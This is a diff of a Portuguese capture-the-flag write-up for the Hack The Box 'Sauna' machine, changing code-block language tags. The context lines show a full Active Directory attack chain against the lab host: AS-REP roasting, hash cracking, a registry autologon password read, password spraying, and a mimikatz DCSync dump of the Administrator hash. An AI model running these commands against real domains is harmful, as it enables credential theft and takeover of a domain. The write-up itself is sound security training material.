@@ -192,7 +192,7 @@
 <p>Como sempre, para qualquer PenTest, precisamos saber qual é o alvo. E o primeiro passo para isso é enumerar as portas da máquina! Uma das melhores e mais conhecidas ferramentas para enumerar as portas de uma máquina ou conjunte de máquina é o NMAP.</p>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/Enum-nmap-allports.png" alt="Enumeração nmap allPorts" /></p>
-<pre><code class="language-bash">nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49677,49700,49720 10.10.10.175 -vvv -oN enumeration/nmap-A.txt -Pn
+<pre><code class="language-powershell">nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49677,49700,49720 10.10.10.175 -vvv -oN enumeration/nmap-A.txt -Pn
 </code></pre>
 <pre><code class="language-txt"># Nmap 7.91 scan initiated Wed Sep 15 21:03:01 2021 as: nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49675,49676,49677,49700,49720 -vvv -oN enumeration/nmap-A.txt -Pn 10.10.10.175
 Nmap scan report for 10.10.10.175
@@ -257,7 +257,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>A passear pelo site, não se vê nada de interessante a não ser a página about.html que poderá ter potenciais usuários de uma eventual empresa (Já que é um Active directory ou um Domain Controller)</p>
 <p>Numa empresa, os usuários costumam ser identificados por primeira letra dos primeiros nomes, e ultimo nome completo. junto, ou separado por um ponto. Isto é extremamente comum... Por isso, vamos extrair esse potenciais usuários para um ficheiro, e daí fazer um arquivo com usernames.</p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/web-server-get-users.png" alt="Web Server get users" /></p>
-<pre><code class="language-bash">cat users-full-name
+<pre><code class="language-powershell">cat users-full-name
 #&gt;  Fergus Smith
 #&gt;  Hugo Bear
 #&gt;  Steven Kerb
@@ -302,13 +302,13 @@ cat users-full-name | tr '[A-Z]' '[a-z]' | awk '{print substr ($1,0,1) &quot;.&q
 <p>Para isso existem diversas ferramentas. Para esta máquina irei utilizar uma que, com ajuda da nossa lista de potenciais usuários, irá solicitar um TGT de cada usuário, e se o usuário existir e tiver a opção &quot;Do not require Kerberos preauthentication&quot;, iremos receber diretamente um TGT.</p>
 <h2 id="getnpuserspy"><a class="header" href="#getnpuserspy">GetNPUsers.py</a></h2>
 <p>Ainda antes do attack AS-REP Roasting Attack, poderíamos tentar ver recursos SMB e RPC, que são mais rápidos. Mas adiento já que não se vai ver nada para ambos. No entanto, para futuros ataques, precisamos saber mais informações sobre a máquina... Durante a tentativa de conexão por SMB, é possível recolher informações sobre o nome do domínio, e assim informar o nosso /etc/hosts para que haja menos problemas nos ataques futuros.</p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.175
+<pre><code class="language-powershell">crackmapexec smb 10.10.10.175
 #&gt;  SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
 
 echo -e &quot;10.10.10.175\tegotistical-bank.local&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <p>Voltando ao ataque!</p>
-<pre><code class="language-bash">GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users
+<pre><code class="language-powershell">GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
@@ -319,11 +319,11 @@ Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 #&gt;  ...
 </code></pre>
 <p>O que é isso? <strong>$krb5asrep$23$fsmith</strong>... é o tal TGT do usuário fsmith! Agora, se a palavra pass estiver no rockyou.txt (Lista enorme de palavras passes que, em seu tempo, vazou na internet), é pssível crackear esse TGT com a ajuda da ferramenta &quot;John the Ripper&quot;.</p>
-<pre><code class="language-bash">nano fsmith_hash  # paste the hash and save...
+<pre><code class="language-powershell">nano fsmith_hash  # paste the hash and save...
 john --wordlist=/usr/share/wordlists/rockyou.txt fsmith_hash  # Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
 </code></pre>
 <p>Já temos uma credencial. Temos de validá-lo! Para isso, o crackmapexec é muito útil!</p>
-<pre><code class="language-bash"># Sabemos que o serviço SMB está activo.
+<pre><code class="language-powershell"># Sabemos que o serviço SMB está activo.
 crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 
 #&gt;  SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
@@ -343,7 +343,7 @@ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 <p><img src="Assets/HTB-Windows-Easy-Sauna/InTheMachine-user-fsmith.png" alt="In the machine with user fsmith" /></p>
 <h1 id="primeiro-pé-na-máquina"><a class="header" href="#primeiro-pé-na-máquina">Primeiro pé na máquina</a></h1>
 <p>Sabemos que é um Active Directory / Domain Controller. A primeira coisa a fazer num AD/DC é enumerar todos os usuários. Existem 2 tipos de usuários. Usuários Locais, e usuários de domínio. Para enumerar os usuários locais, podemos efectuar um &quot;net users&quot;:</p>
-<pre><code class="language-bash">net users
+<pre><code class="language-powershell">net users
 #&gt;
 #&gt;  User accounts for \\
 #&gt;
@@ -354,14 +354,14 @@ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 <p>Adicionemos esse usuários à nossa lista... Não me foi possível enumerar os usuários de domínio através de &quot;Get-DomainUser&quot;, nem com &quot;wmic useraccount get name,sid&quot;...</p>
 <p>O segundo passo é ver se existem passwords por defeito. Esta máquina é uma simulação de uma empresa (Muito pequena certo, mas em grande escala as coisas funcionam exatamente da mesma maneira...), Portanto, existe sempre a possibilidade de os administradores decidirem adicionar uma palavra pass por defeito, para que a posterior, depois de criar um novo usuário, esse usuário altere a password para uma da sua escolha. O problema é que, se não for definido no windows para ser obrigatória a mudança de password no próximo login, os usuário podem ser preguiçoso e não alteram esta password por defeito. Até mesmo os administradores... como iremos ver neste caso...</p>
 <p>Poderíamos utilizar o winPEAS64.exe para obter esta informação, mas com uma única linha de commando, podemos abrir o REG do &quot;autologon&quot; e descobrir a tal password por defeito...</p>
-<pre><code class="language-bash">cmd /c 'reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON&quot;'
+<pre><code class="language-powershell">cmd /c 'reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON&quot;'
 
 #&gt;  ...
 #&gt;  DefaultPassword    REG_SZ    Moneymakestheworldgoround!
 #&gt;  ...
 </code></pre>
 <p>Com essa password, podemos efectuar um ataque de spray a todos os usuários para tentar ver se algum tem essa password... Existem montes de ferramentas, mas vamos tentar sempre usar ao máximo as ferramentas que já utilizamos. Crackmapexec! (E não esquecer que para esta máquina, utilizamos o crackmapexec tanto em modo SMB como WINRM por esse 2 serviços estarem ligados e operaionais!)</p>
-<pre><code class="language-bash">crackmapexec smb 10.10.10.175 -u users -p 'Moneymakestheworldgoround!'
+<pre><code class="language-powershell">crackmapexec smb 10.10.10.175 -u users -p 'Moneymakestheworldgoround!'
 #&gt; SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
 #&gt; SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
 #&gt; SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hbear:Moneymakestheworldgoround! STATUS_LOGON_FAILURE
@@ -387,26 +387,26 @@ crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
 <p>Mesma história... Este novo usuário tem privilégios para aceder à máquina via WinRM provavelmente por ser membro de um groupo chamado <strong><em>&quot;BUILTIN\Remote Management Users&quot;</em></strong></p>
 <h1 id="bloodhound"><a class="header" href="#bloodhound">BloodHound</a></h1>
 <p>Já dentro da máquina, Mesmo tendo um shell verdadeiro e tal, nunca é fácil ver tudo rapidamente, nem é fácil saber por que caminho ir... Para além da mencionada ferramenta winPEAS64.exe, disponível no github, hà uma ferramenta espetacular para visualizar em modo gráfico todos os ramos entre usuários e groupos de todo um domain controller! Esta ferramenta é a <strong>BloodHound</strong>. O programa precisa de uma base de dados, o neo4j, que é uma base de dados graph.</p>
-<pre><code class="language-bash">sudo neo4j start
+<pre><code class="language-powershell">sudo neo4j start
 
 bloodhound &amp;&gt;/dev/null &amp;
 </code></pre>
 <p>Agora que dados por nessa base de dados?!</p>
 <p>Existem também diversas ferramentas lol (como quase tudo em PenTesting), mas acho que a mais cómoda e de forma totalmente remota desde o meu Kali-Linux é com a ferramenta <strong><em>&quot;bloodhound-python&quot;</em></strong></p>
-<pre><code class="language-bash">bloodhound-python -c All -u fsmith -p 'Thestrokes23' -d egotistical-bank.local -ns 10.10.10.175 -dc egotistical-bank.local
+<pre><code class="language-powershell">bloodhound-python -c All -u fsmith -p 'Thestrokes23' -d egotistical-bank.local -ns 10.10.10.175 -dc egotistical-bank.local
 </code></pre>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/BloodHound.png" alt="BloodHound-python" /></p>
 <p>Importe o resultado para o bloodhound</p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/Bloodhound_import.png" alt="BloodHound Import" /></p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/Videograma.webp" alt="BloodHound Video" /></p>
 <p>Este videograma é um mini exemplo do que se pode fazer com BloodHound. Isto representa todo o AD/DC e permite filtrar e encontrar caminhos mais facilmente...</p>
-<p>O parte final do video indica um caminho potencial, e indica também o que fazer para comprometer o domain controller! Com a credential que temos do user svc<em>loanmgr, temos possibilidade de nos converter no usuário de domínio que queremos. BloodHound também nos indica a ferramenta a utilizar para isso! **_MIMIKATZ</em>** e até o comando adequado **<em>lsadump::dcsync /domain:testlab.local /user:Administrator</em>**</p>
+<p>O parte final do video indica um caminho potencial, e indica também o que fazer para comprometer o domain controller! Com a credential que temos do user svc*loanmgr, temos possibilidade de nos converter no usuário de domínio que queremos. BloodHound também nos indica a ferramenta a utilizar para isso! **_MIMIKATZ*** e até o comando adequado **<em>lsadump::dcsync /domain:testlab.local /user:Administrator</em>**</p>
 <p>Essa vulnerabilidade existe porque o usuário svc_loanmgr tem privilégios de DS-Replication-Get-Changes-All e de DS-Replication-Get-Changes no Domínio. Esse dois privilégios em conjunto permite executar o que é chamado de DCSync attack. É parecido ao que acontece quando se tem privilégios locais de SeImpersonatePrivileges, mas em Domain Controller.</p>
 <h1 id="escalada-de-privilégios"><a class="header" href="#escalada-de-privilégios">Escalada de Privilégios</a></h1>
-<pre><code class="language-bash"># Atenção ao link... só posso garantir estar válido AGORA MESMO enquanto escrevo...
+<pre><code class="language-powershell"># Atenção ao link... só posso garantir estar válido AGORA MESMO enquanto escrevo...
 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip
 </code></pre>
-<pre><code class="language-bash"># Evil-winrm tem uma opção de upload... (Não é perciso certutil.exe, ou IWR, ou outras formas de transferir ficheiros)
+<pre><code class="language-powershell"># Evil-winrm tem uma opção de upload... (Não é perciso certutil.exe, ou IWR, ou outras formas de transferir ficheiros)
 upload mimikatz.exe
 .\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit
 
@@ -433,7 +433,7 @@ upload mimikatz.exe
 <p>A resposta é comprida... mas pelo meio encontra-se o Hash NTML do usuário de domínio Administrator. Verificamos as credenciais, sempre com a mesma ferramenta crackmapexec</p>
 <p><img src="Assets/HTB-Windows-Easy-Sauna/PrivEsc-Administrator-login.png" alt="Administrator Login" /></p>
 <p>E já somos donos de todo o Domain Controller! Podemos fazer o que quisermos... Agora podemos facilmente ver as flags...</p>
-<pre><code class="language-bash">cmd /c 'dir /r /s root.txt user.txt'  # As flags encontram-se repetidos e diferentes locais. Para não se procurar muito manualmente lool
+<pre><code class="language-powershell">cmd /c 'dir /r /s root.txt user.txt'  # As flags encontram-se repetidos e diferentes locais. Para não se procurar muito manualmente lool
 type 'C:\Users\Administrator\Desktop\root.txt'
 #&gt;  1e5fcd4ecf49643b2ef3cf..........
 type 'C:\Users\FSmith\Desktop\user.txt'
